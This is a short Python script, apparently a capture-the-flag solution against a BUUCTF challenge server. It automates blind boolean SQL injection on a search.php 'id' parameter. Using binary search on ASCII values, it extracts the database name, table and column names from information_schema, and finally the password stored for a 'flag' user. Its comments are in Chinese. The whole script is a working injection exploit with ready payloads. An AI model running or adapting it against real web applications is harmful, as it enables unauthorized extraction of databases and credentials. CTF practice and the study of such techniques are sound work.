import requests
import time

url='http://7a41b468-3129-48c8-88f8-052fcd7b2842.node4.buuoj.cn:81/search.php?id=1^1^'

flag=""
for i in range(1,1000):
    begin=32
    end=126
    mid=(begin+end)//2      #用二分法查找 ,//表示除法向下取整，会出小数
    while(begin<end):
        print(f"begin:{begin},mid:{mid},end{end}")
        #payload=f"(ascii(substr((select(database())),{i},1))>{mid})"   #爆破数据库名
        #payload=f"(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),{i},1))>{mid})"  #爆破列名
        #payload=f"(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')),{i},1))>{mid})" #爆破字段
        #payload=f"(ascii(substr((select(group_concat(password))from(F1naI1y)),{i},1))>{mid})"  #爆密码
        payload=f"(ascii(substr((select(password)from(F1naI1y)where(username='flag')),{i},1))>{mid})"
        r=requests.get(url+payload)
        if("Click" in r.text):     #说明这个条件正确
            begin=mid+1
            mid=(begin+end)//2
        else:     #说明不正确
            end=mid
            mid=(begin+end)//2
        time.sleep(0.2)
    flag+=chr(mid)
    print(flag)
    if(begin==32):  #说明这个字符不存在了，已经全部爆出
        break
        print("")



